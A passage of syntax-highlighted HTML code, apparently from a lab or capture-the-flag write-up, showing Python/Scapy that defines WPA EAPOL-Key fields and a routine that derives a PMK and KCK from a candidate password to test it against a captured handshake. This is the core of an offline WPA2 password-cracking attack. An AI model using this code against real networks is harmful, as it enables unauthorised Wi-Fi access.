plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'RC4'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'RSN'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        BitField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'reserved2'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        BitField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'smk_message'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        BitField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'encrypted_key_data'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        BitField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'request'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        BitField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'error'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        BitField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'secure'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        BitField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'has_key_mic'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        BitField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'key_ack'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        BitField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'install'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        BitField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'key_index'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        BitEnumField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'key_type'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'Group/SMK'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'Pairwise'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        BitEnumField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'key_descriptor_type_version'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'HMAC-MD5+ARC4'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'HMAC-SHA1-128+AES-128'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token number">3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'AES-128-CMAC+AES-128'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token number">0x20</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'SALSA20-HMAC'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        LenField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'key_length'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'H'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        LongField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'key_replay_counter'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        XStrFixedLenField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'key_nonce'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b'\x00'</span><span class="token operator">*</span><span class="token number">32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        XStrFixedLenField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'key_iv'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b'\x00'</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">16</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        XStrFixedLenField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'key_rsc'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b'\x00'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">8</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        XStrFixedLenField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'key_id'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b'\x00'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">8</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        XStrFixedLenField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'key_mic'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b'\x00'</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">16</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        LenField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'wpa_key_length'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'H'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        ConditionalField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            XStrLenField</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'key'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b'\x00'</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                         length_from</span><span class="token operator">=</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">lambda</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">wpa_key_length</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">lambda</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">wpa_key_length </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">and</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">wpa_key_length </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">customPRF512</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">key</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> amac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> smac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> anonce</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> snonce</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:rgb(255, 121, 198)">"""Source https://stackoverflow.com/questions/12018920/"""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    A </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b"Pairwise key expansion"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    B </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b""</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">join</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token builtin" style="color:rgb(189, 147, 249)">sorted</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">amac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> smac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">sorted</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">anonce</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> snonce</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    num_bytes </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">64</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    R </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b''</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> i </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">range</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">num_bytes </span><span class="token operator">*</span><span class="token plain"> </span><span class="token number">8</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> </span><span class="token number">159</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">//</span><span class="token plain"> </span><span class="token number">160</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        R </span><span class="token operator">+=</span><span class="token plain"> hmac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">new</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">key</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> A </span><span class="token operator">+</span><span class="token plain"> chb</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">0x00</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> B </span><span class="token operator">+</span><span class="token plain"> chb</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">i</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> hashlib</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">sha1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">digest</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> R</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain">num_bytes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">calc</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">pwd</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    amac </span><span class="token operator">=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">bytes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">fromhex</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'02:00:00:00:00:00'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">replace</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">':'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">''</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    smac </span><span class="token operator">=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">bytes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">fromhex</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'02:00:00:00:01:00'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">replace</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">':'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">''</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    anonce </span><span class="token operator">=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">bytes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">fromhex</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token string" style="color:rgb(255, 121, 198)">'7338c25bf9d1bba6a8dea56e87bb8b6a2e3f658be7ba8173c6ab58991e648e5f'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    snonce </span><span class="token operator">=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">bytes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">fromhex</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token string" style="color:rgb(255, 121, 198)">'82ce083ab0cdb46f1ae0cc94a922cdf7ca742bf130396996f92be706cca62a25'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    PMK </span><span class="token operator">=</span><span class="token plain"> hashlib</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">pbkdf2_hmac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'sha1'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> pwd</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b'turtle1'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">4_096</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    KCK </span><span class="token operator">=</span><span class="token plain"> customPRF512</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">PMK</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> amac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> smac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> anonce</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> snonce</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token number">16</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    keydata </span><span class="token operator">=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">bytes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">fromhex</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">'ace914ed4b7bf2b638b81c841bd3ab67561681d57591496ff93465d173c04f911679a118fb7f9590faef7fe21aa5c82d8bc746b190ea84e1'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">assert</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">keydata</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">==</span><span class="token plain"> </span><span class="token number">56</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ek </span><span class="token operator">=</span><span class="token plain"> EAPOL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">version</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">'802.1X-2004'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token builtin" style="color:rgb(189, 147, 249)">type</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">'EAPOL-Key'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">/</span><span class="token plain"> EAPOL_KEY</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        key_descriptor_type</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> key_descriptor_type_version</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> install</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> key_type</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> key_ack</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain">\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        has_key_mic</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> secure</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> encrypted_key_data</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 